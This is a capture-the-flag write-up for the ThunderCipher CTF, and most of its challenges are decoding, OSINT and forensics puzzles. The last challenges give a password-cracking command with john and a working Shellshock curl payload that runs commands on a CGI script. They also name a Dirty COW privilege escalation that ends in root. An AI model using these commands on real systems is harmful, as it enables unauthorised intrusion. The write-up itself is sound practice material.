---
title: "ThunderCipher CTF Writeup"
date: 2026-03-10
category: CTF
tags: [thundercipher, cryptography, osint, forensics, web, reverse]

image:
  path: /assets/img/posts/thundercipher.png

excerpt: Writeups and solutions for ThunderCipher CTF challenges.

---

## Introduction

This post contains my writeups for several challenges from the **ThunderCipher CTF**.  
The challenges covered multiple domains including **Cryptography, OSINT, Web Exploitation, Forensics, Hardware Analysis, and Binary Signal Analysis**.

---

# 1. Easy Cipher

## Challenge Overview

The challenge provided only a ciphertext string without any additional files.

From its structure, it appeared to be an encoded string rather than encrypted data.

## Analysis

The string contained:

- Uppercase and lowercase letters
- Numbers
- A structure typical of encoded text

This pattern suggested **Base64 encoding**, which is commonly used in beginner cryptography challenges.

## Solution

I used **CyberChef** to decode the string using the Base64 decode function.

Steps:

1. Open CyberChef
2. Paste the ciphertext
3. Apply **From Base64**

The decoding immediately revealed the flag.

## Flag
ThunderCipher{34sy_b4s3}

---

# 2. Hidden in Plain Sight

## Challenge Overview

This OSINT challenge suggested that the flag was hidden on the **official ThunderCipher YouTube channel**.

## Investigation

Initial steps included:

- Checking the channel **bio**
- Reviewing **video descriptions**
- Looking through **comments**

At first, nothing appeared useful.

However, when revisiting the **bio section**, I noticed a blank-looking area after a message saying the flag was not there.

Scrolling further revealed hidden encoded text.

## Decoding

The text appeared to be **Base58 encoded**.

Using a Python script to decode it revealed the flag.

## Flag
ThunderCipher{thund3rc1ph3r_y0utub3!!}

---

# 3. Our Holy Father

## Challenge Overview

This OSINT challenge required identifying the **church shown in the provided image**.

## Investigation

Steps taken:

1. Uploaded the image to **Google Lens**
2. Identified architectural and location clues
3. Performed searches using the results

Google provided a **Maps result containing the complete church name**.

## Flag
ThunderCipher{Eglise_Notre_Dame_du_Vent}

---

# 4. Good Advice

## Challenge Overview

This challenge provided a **corrupted audio file**.

The file could not be played normally.

## Analysis

Using a hex dump, I noticed that the **WAV header was missing**, which explained why the audio player could not read it.

## Fixing the File

I restored the WAV header manually using Python and saved the repaired file.

After generating `decoded_audio.wav`, I listened to the file.

The audio contained spoken characters:
"A one" → A1
"W four" → W4
"Y S T H three" → YSTH3
"R three four U" → R34U

Combining them produced: A1W4YSTH3R34U

## Flag
ThunderCipher{A1W4YSTH3R34U}

---

# 5. Discord

## Challenge Overview

This miscellaneous challenge required checking the **official ThunderCipher Discord server**.

## Investigation

Inside the **general channel**, clicking the message:
Hi @everyone

revealed the flag.

## Flag
ThunderCipher{pinged_in_discord}

---

# 6. Web – Directory Discovery

## Investigation

Opening the provided link revealed nothing useful.

Inspecting the **page source** revealed a hint directing me to check: robots.txt

This file contained hidden directories.

Exploring them revealed the directory: /txt-of-thunder/

Inside the page source of this directory, the flag was present.

## Flag
ThunderCipher{txt_of_thunder_7681912}

---

# 7. Web – Source of Thunder

## Investigation

The webpage initially appeared normal.

Inspecting the **source code** revealed that the flag was split into three parts:

- First part in **HTML source**
- Second part in **style.css**
- Third part in **app.js**

Combining all parts reconstructed the complete flag.

---

# 8. Forensics – DMY1

## Analysis

After extracting the provided ZIP archive, I found a file: File.DMP

To analyze it, I used: foremost

to carve files from the dump.

The extraction produced several images.

One of the recovered images contained the flag.

## Flag
ThunderCipher{H0l4-4m!g0^}

---

# 9. I Hate That Scammer

## Investigation

The challenge contained a suspicious text file.

The content appeared encoded using a **scam-mimic style encoding**.

After several attempts, the correct password was identified as: SCAM

Using this password to decode the content revealed the flag.

## Flag
ThunderCipher{h3_us3d_t0_sp4m_w1th0ut_4_p4ssw0rd}

---

# 10. Convo 1

## Exploration

Extracting the archive: unzip Session.zip

produced: Session- Cap.sal
                   digital-0.bin
                   meta.json

The metadata indicated a **24 MHz sample rate**.

## Signal Analysis

The binary data revealed two pulse durations:
Short pulse ≈ 2.88M samples
Long pulse ≈ 8.64M samples

This timing pattern corresponds to **Morse Code (1T vs 3T)**.

## Decoding

A script converted the pulses to Morse symbols and then to ASCII.

Output: The Flag is D0ts4nDd4$h3s

## Flag
ThunderCipher{D0ts4nDd4$h3s}

---

# 11. Convo 2

## Dataset

This challenge contained a **3GB logic capture dataset**.

The metadata indicated: Sample Rate: 1 GHz
                        Probe: D0

## Analysis

Initial investigation suggested the signal represented **UART serial communication**.

Using brute force, the correct parameters were identified: Baud Rate: 230400
                                                           Polarity: Standard                        

## Decoding

The decoded stream revealed three encoded components:

| Encoding | Result |
|--------|--------|
| Hex | ThunderCipher{H3lL0_w |
| Base64 | 0RlD_1n_u |
| Base32 | 4Rt_#$!} |

Combining them produced the final flag.

## Flag
ThunderCipher{H3lL0_w0RlD_1n_u4Rt_#$!}

---

# 12. Panel – PCB Analysis

## Challenge Overview

The challenge included **Gerber files**, which are used in PCB manufacturing.

## Investigation

Using **pygerber**, I rendered the layers into images: python3 -m pygerber render raster -o InnerLayer4.png -d 40 Gerber_InnerLayer4.G4

The internal PCB layer contained a hidden string: KRUHK3TEMVZEG2LQNBSXE6ZBI4ZXEYS7KYYTG526FF5X2

The character set suggested **Base32 encoding**.

## Flag
ThunderCipher{!G3rb_V13w^}

---

# 13. Tree

## Analysis

The extracted JPEG file contained obfuscated text with printable ASCII characters and symbols.

The pattern matched **ROT47 encoding**.

ROT47 rotates characters within the ASCII range 33–126.

After decoding, the flag appeared.

## Flag
ThunderCipher{tr33s_4r3_h1dd3n}

---

# 14. Dotsies Font

## Investigation

The displayed message used the **Dotsies font**, which represents characters using dot patterns.

Decoding the dot patterns revealed the hidden message.

## Flag
ThunderCipher{JUST_TAKING_A_DOT_OUT_ON_A_DATE}

---

# 15. Unauthenticated Strike

## Step 1 – ZIP Password Crack

The ZIP archive was password-protected.

Using:
zip2john joel.zip > hash.txt
john --wordlist=wordlist.txt hash.txt

Recovered password: youfoundme1

## Step 2 – File Inspection

Extracted files are:
.hacker.jpeg
file.cap

Running `strings` on the image revealed encoded text.

Decoding the text using **ROT47** produced a Google Drive link containing the flag.

## Flag
ThunderCipher{y0u_f0und_m3_n1ce!}

---

# 16. CyberHunt

## Reconnaissance

Using Nmap: nmap -sT -p- --min-rate=1000 <TARGET_IP>

Open ports: 22 – SSH and 80 – HTTP


## Web Enumeration
gobuster dir -u http://target/cgi-bin/ -w common.txt -x sh,cgi

Discovered: /cgi-bin/test.sh

## Exploitation – Shellshock

Testing with: curl -H "User-Agent: () { :; }; echo; /bin/id" http://target/cgi-bin/test.sh

confirmed **Shellshock RCE**.

## Privilege Escalation

Kernel version: 3.2.0


This version is vulnerable to **Dirty COW (CVE-2016-5195)**.

Using the exploit allowed modification of `/etc/passwd`, creating a root user.

## Final Flag
ThunderCipher{dirty_cow_owned_the_kernel_08918}

---

# Conclusion

This CTF included challenges across multiple domains:

- Cryptography
- OSINT
- Web exploitation
- Digital forensics
- Hardware analysis
- Binary signal decoding
- Full system exploitation

Each challenge required a combination of **technical tools, analytical reasoning, and reverse engineering techniques**.
